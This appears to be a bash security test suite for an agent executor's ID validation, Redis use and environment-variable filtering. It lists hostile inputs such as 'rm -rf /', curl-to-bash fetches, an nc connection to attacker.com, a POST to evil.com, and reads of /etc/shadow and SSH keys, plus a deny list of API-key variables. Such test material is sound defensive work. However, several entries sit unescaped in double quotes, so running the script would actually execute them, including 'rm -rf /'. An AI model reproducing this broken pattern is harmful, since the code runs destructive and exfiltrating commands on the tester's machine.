#!/usr/bin/env bash
# tests/security/test-agent-executor-bidirectional-messaging.sh
# Security Test Suite: Agent Executor Bidirectional Messaging
# Tests AgentCommandProcessor security, command validation, and Redis coordination

set -euo pipefail

PROJECT_ROOT=$(git rev-parse --show-toplevel)
source "$PROJECT_ROOT/tests/test-utils.sh"

# Test configuration
TEST_ID="security-bidirectional-$(date +%s)-$$"
TASK_ID="security-test-${TEST_ID}"
AGENT_ID="security-test-agent-${TEST_ID}"
REDIS_TEST_KEY="test-agent-messaging-${TEST_ID}"
REDIS_PORT="${CFN_REDIS_PORT:-6379}"
REDIS_HOST="${CFN_REDIS_HOST:-localhost}"

# Security test counters
SECURITY_TESTS_PASSED=0
SECURITY_TESTS_FAILED=0
SECURITY_TESTS_TOTAL=0

security_pass() { 
    echo "✅ SECURITY PASS: $1"; 
    SECURITY_TESTS_PASSED=$((SECURITY_TESTS_PASSED + 1)); 
    SECURITY_TESTS_TOTAL=$((SECURITY_TESTS_TOTAL + 1)); 
    return 0; 
}

security_fail() { 
    echo "❌ SECURITY FAIL: $1"; 
    SECURITY_TESTS_FAILED=$((SECURITY_TESTS_FAILED + 1)); 
    SECURITY_TESTS_TOTAL=$((SECURITY_TESTS_TOTAL + 1)); 
    return 0; 
}

cleanup() {
    log_info "Cleaning up security test artifacts..."
    
    # Clean up Redis test keys
    if command -v redis-cli >/dev/null 2>&1; then
        redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" del "$REDIS_TEST_KEY" >/dev/null 2>&1 || true
        redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" del "swarm:${TASK_ID}:${AGENT_ID}:done" >/dev/null 2>&1 || true
        redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" del "cfn-completion:${TASK_ID}" >/dev/null 2>&1 || true
    fi
    
    # Clean up test files
    rm -f /tmp/security-test-${TEST_ID}.* 2>/dev/null || true
    
    log_info "Security test cleanup complete"
}
trap cleanup EXIT

test_command_injection_protection() {
    log_step "SECURITY TEST 1: Command Injection Protection in validateTaskId"
    
    # Test malicious taskId patterns that should be rejected
    local malicious_task_ids=(
        "task'; rm -rf /; #"
        "task\$(rm -rf /)"
        "task|rm -rf /"
        "task&&rm -rf /"
        "task`rm -rf /`"
        "../../etc/passwd"
        "../../../root/.ssh/id_rsa"
        "'; DROP TABLE agents; --"
        "<script>alert('xss')</script>"
        "$(whoami)"
        "`id`"
    )
    
    local injection_blocked=0
    local total_malicious=${#malicious_task_ids[@]}
    
    for malicious_id in "${malicious_task_ids[@]}"; do
        # Test the validateTaskId function from agent-executor.ts
        if node -e "
            const taskId = '${malicious_id}';
            const pattern = /^([a-z]+:)?[a-zA-Z0-9_.-]+$/;
            const isValid = pattern.test(taskId);
            console.log(isValid ? 'PASS' : 'BLOCK');
        " 2>/dev/null | grep -q "BLOCK"; then
            ((injection_blocked++))
        fi
    done
    
    if [ "$injection_blocked" -eq "$total_malicious" ]; then
        security_pass "Command injection protection blocks all ${total_malicious} malicious patterns"
    else
        security_fail "Command injection protection failed - blocked $injection_blocked/$total_malicious"
    fi
}

test_agent_id_validation_security() {
    log_step "SECURITY TEST 2: Agent ID Validation Security"
    
    # Test malicious agentId patterns
    local malicious_agent_ids=(
        "agent'; sudo rm -rf /; #"
        "agent\$(curl malicious.com | bash)"
        "agent|nc attacker.com 4444"
        "../../../etc/shadow"
        "'; UPDATE agents SET password='hacked'; --"
        "$(curl -X POST http://evil.com/steal)"
        "`wget -O- http://malicious.com/payload`"
        "admin/root/escalate"
        "../../root/.bashrc"
    )
    
    local agent_id_blocked=0
    local total_agent_malicious=${#malicious_agent_ids[@]}
    
    for malicious_id in "${malicious_agent_ids[@]}"; do
        # Test the validateAgentId function from agent-executor.ts
        if node -e "
            const agentId = '${malicious_id}';
            const pattern = /^[a-zA-Z0-9_-]+$/;
            const isValid = pattern.test(agentId);
            console.log(isValid ? 'PASS' : 'BLOCK');
        " 2>/dev/null | grep -q "BLOCK"; then
            ((agent_id_blocked++))
        fi
    done
    
    if [ "$agent_id_blocked" -eq "$total_agent_malicious" ]; then
        security_pass "Agent ID validation blocks all ${total_agent_malicious} malicious patterns"
    else
        security_fail "Agent ID validation failed - blocked $agent_id_blocked/$total_agent_malicious"
    fi
}

test_redis_parameterized_queries() {
    log_step "SECURITY TEST 3: Redis Parameterized Query Security"
    
    # Verify Redis operations use parameterized queries (not string concatenation)
    local agent_executor_file="$PROJECT_ROOT/src/cli/agent-executor.ts"
    
    if [ ! -f "$agent_executor_file" ]; then
        security_fail "agent-executor.ts not found"
        return
    fi
    
    # Check for safe Redis operations
    local safe_patterns_found=0
    local unsafe_patterns_found=0
    
    # Safe patterns: parameterized Redis calls
    local safe_patterns=(
        "await redisClient.lPush("
        "await redisClient.get("
        "await redisClient.set("
        "await redisClient.del("
        "redisClient.lPush(key, value)"
        "redisClient.set(key, value)"
    )
    
    # Unsafe patterns: string concatenation with Redis
    local unsafe_patterns=(
        "redis-cli.*\${"
        "redis-cli.*\$("
        "redis-cli.*\`.*\`"
        "exec.*redis-cli"
        "spawn.*redis-cli"
    )
    
    for pattern in "${safe_patterns[@]}"; do
        if grep -q "$pattern" "$agent_executor_file" 2>/dev/null; then
            ((safe_patterns_found++))
        fi
    done
    
    for pattern in "${unsafe_patterns[@]}"; do
        if grep -q "$pattern" "$agent_executor_file" 2>/dev/null; then
            ((unsafe_patterns_found++))
        fi
    done
    
    if [ "$safe_patterns_found" -gt 0 ] && [ "$unsafe_patterns_found" -eq 0 ]; then
        security_pass "Redis operations use parameterized queries (safe: $safe_patterns_found, unsafe: $unsafe_patterns_found)"
    else
        security_fail "Redis security issues - safe patterns: $safe_patterns_found, unsafe patterns: $unsafe_patterns_found"
    fi
}

test_environment_variable_whitelist() {
    log_step "SECURITY TEST 4: Environment Variable Whitelist Security"
    
    local agent_executor_file="$PROJECT_ROOT/src/cli/agent-executor.ts"
    
    if [ ! -f "$agent_executor_file" ]; then
        security_fail "agent-executor.ts not found"
        return
    fi
    
    # Check for whitelist implementation
    if grep -q "safeEnvVars" "$agent_executor_file" 2>/dev/null; then
        security_pass "Environment variable whitelist implemented"
    else
        security_fail "Environment variable whitelist not found"
        return
    fi
    
    # Verify dangerous variables are NOT in the whitelist
    local dangerous_vars=(
        "ANTHROPIC_API_KEY"
        "OPENAI_API_KEY"
        "KIMI_API_KEY"
        "AWS_SECRET_ACCESS_KEY"
        "GITHUB_TOKEN"
        "DATABASE_PASSWORD"
        "REDIS_PASSWORD"
        "JWT_SECRET"
        "SSL_CERTIFICATE"
        "PRIVATE_KEY"
    )
    
    local dangerous_exposed=0
    for var in "${dangerous_vars[@]}"; do
        # Check if dangerous variable is passed through to spawned process
        if grep -q "env\.$var\s*=" "$agent_executor_file" 2>/dev/null; then
            ((dangerous_exposed++))
        fi
    done
    
    # Check for safe variables that SHOULD be in whitelist
    local safe_vars_required=(
        "CFN_REDIS_HOST"
        "CFN_REDIS_PORT"
        "PATH"
        "NODE_ENV"
        "TASK_ID"
        "AGENT_ID"
    )
    
    local safe_vars_found=0
    for var in "${safe_vars_required[@]}"; do
        if grep -q "$var" "$agent_executor_file" 2>/dev/null; then
            ((safe_vars_found++))
        fi
    done
    
    if [ "$dangerous_exposed" -eq 0 ] && [ "$safe_vars_found" -ge 4 ]; then
        security_pass "Environment variable filtering secure (dangerous exposed: $dangerous_exposed, safe found: $safe_vars_found)"
    else
        security_fail "Environment variable filtering insecure (dangerous exposed: $dangerous_exposed, safe found: $safe_vars_found)"
    fi
}

test_command_processor_authorization() {
    log_step "SECURITY TEST 5: Command Processor Authorization"
    
    local agent_executor_file="$PROJECT_ROOT/src/cli/agent-executor.ts"
    
    if [ ! -f "$agent_executor_file" ]; then
        security_fail "agent-executor.ts not found"
        return
    fi
    
    # Check that only safe commands are handled by command processor
    local safe_commands=(
        "status"
        "redirect" 
        "abort"
        "pause"
    )
    
    local safe_commands_found=0
    for cmd in "${safe_commands[@]}"; do
        if grep -q "onCommand('$cmd'" "$agent_executor_file" 2>/dev/null; then
            ((safe_commands_found++))
        fi
    done
    
    # Check for dangerous command patterns that should NOT be present
    local dangerous_patterns=(
        "onCommand('exec'"
        "onCommand('system'"
        "onCommand('eval'"
        "onCommand('shell'"
        "eval.*command"
        "exec.*payload"
    )
    
    local dangerous_patterns_found=0
    for pattern in "${dangerous_patterns[@]}"; do
        if grep -q "$pattern" "$agent_executor_file" 2>/dev/null; then
            ((dangerous_patterns_found++))
        fi
    done
    
    if [ "$safe_commands_found" -ge 3 ] && [ "$dangerous_patterns_found" -eq 0 ]; then
        security_pass "Command processor authorization secure (safe commands: $safe_commands_found, dangerous patterns: $dangerous_patterns_found)"
    else
        security_fail "Command processor authorization issues (safe: $safe_commands_found, dangerous: $dangerous_patterns_found)"
    fi
}

test_redis_connection_security() {
    log_step "SECURITY TEST 6: Redis Connection Security"
    
    local agent_executor_file="$PROJECT_ROOT/src/cli/agent-executor.ts"
    
    if [ ! -f "$agent_executor_file" ]; then
        security_fail "agent-executor.ts not found"
        return
    fi
    
    # Check for secure Redis connection patterns
    local security_checks=0
    local max_checks=4
    
    # Check 1: Uses environment variables for Redis config
    if grep -q "CFN_REDIS_HOST\|CFN_REDIS_PORT" "$agent_executor_file" 2>/dev/null; then
        ((security_checks++))
    fi
    
    # Check 2: Has error handling for Redis connections
    if grep -q "client.on('error'" "$agent_executor_file" 2>/dev/null; then
        ((security_checks++))
    fi
    
    # Check 3: Uses reconnect strategy
    if grep -q "reconnectStrategy" "$agent_executor_file" 2>/dev/null; then
        ((security_checks++))
    fi
    
    # Check 4: Properly closes Redis connections
    if grep -q "redisClient.quit\|redisClient.disconnect" "$agent_executor_file" 2>/dev/null; then
        ((security_checks++))
    fi
    
    if [ "$security_checks" -eq "$max_checks" ]; then
        security_pass "Redis connection security comprehensive ($security_checks/$max_checks checks passed)"
    else
        security_fail "Redis connection security incomplete ($security_checks/$max_checks checks passed)"
    fi
}

test_command_payload_validation() {
    log_step "SECURITY TEST 7: Command Payload Validation"
    
    local agent_executor_file="$PROJECT_ROOT/src/cli/agent-executor.ts"
    
    if [ ! -f "$agent_executor_file" ]; then
        security_fail "agent-executor.ts not found"
        return
    fi
    
    # Check that command payloads are validated before processing
    local validation_patterns=(
        "command.payload"
        "if.*command.payload"
        "command.payload?."
        "payload?.newTask"
    )
    
    local validation_found=0
    for pattern in "${validation_patterns[@]}"; do
        if grep -q "$pattern" "$agent_executor_file" 2>/dev/null; then
            ((validation_found++))
        fi
    done
    
    # Check for unsafe payload processing
    local unsafe_patterns=(
        "eval.*payload"
        "exec.*payload"
        "Function.*payload"
        "new Function.*payload"
    )
    
    local unsafe_found=0
    for pattern in "${unsafe_patterns[@]}"; do
        if grep -q "$pattern" "$agent_executor_file" 2>/dev/null; then
            ((unsafe_found++))
        fi
    done
    
    if [ "$validation_found" -ge 2 ] && [ "$unsafe_found" -eq 0 ]; then
        security_pass "Command payload validation secure (validation patterns: $validation_found, unsafe: $unsafe_found)"
    else
        security_fail "Command payload validation issues (validation: $validation_found, unsafe: $unsafe_found)"
    fi
}

# Execute all security tests
log_info "=== Agent Executor Bidirectional Messaging Security Tests ==="
log_info "Test ID: $TEST_ID"
log_info "Task ID: $TASK_ID"
log_info "Agent ID: $AGENT_ID"
echo ""

test_command_injection_protection
test_agent_id_validation_security
test_redis_parameterized_queries
test_environment_variable_whitelist
test_command_processor_authorization
test_redis_connection_security
test_command_payload_validation

# Security test summary
echo ""
log_step "Security Test Summary"
echo -e "${GREEN}Total Security Tests: $SECURITY_TESTS_TOTAL${NC}"
echo -e "${GREEN}Passed: $SECURITY_TESTS_PASSED${NC}"
echo -e "${RED}Failed: $SECURITY_TESTS_FAILED${NC}"

if [ "$SECURITY_TESTS_FAILED" -eq 0 ]; then
    echo -e "${GREEN}Security Pass Rate: 100%${NC}"
    echo ""
    echo -e "${GREEN}✅ ALL SECURITY TESTS PASSED${NC}"
    echo ""
    log_info "Agent executor bidirectional messaging is secure"
    log_info "Command injection protection: ACTIVE"
    log_info "Redis parameterized queries: ACTIVE"  
    log_info "Environment variable filtering: ACTIVE"
    log_info "Command processor authorization: ACTIVE"
    exit 0
else
    local pass_rate=$(awk "BEGIN {printf \"%.0f\", ($SECURITY_TESTS_PASSED / $SECURITY_TESTS_TOTAL * 100)}")
    echo -e "${RED}Security Pass Rate: ${pass_rate}%${NC}"
    echo ""
    echo -e "${RED}❌ SECURITY TESTS FAILED${NC}"
    echo -e "${RED}Agent executor has security vulnerabilities that must be addressed${NC}"
    exit 1
fi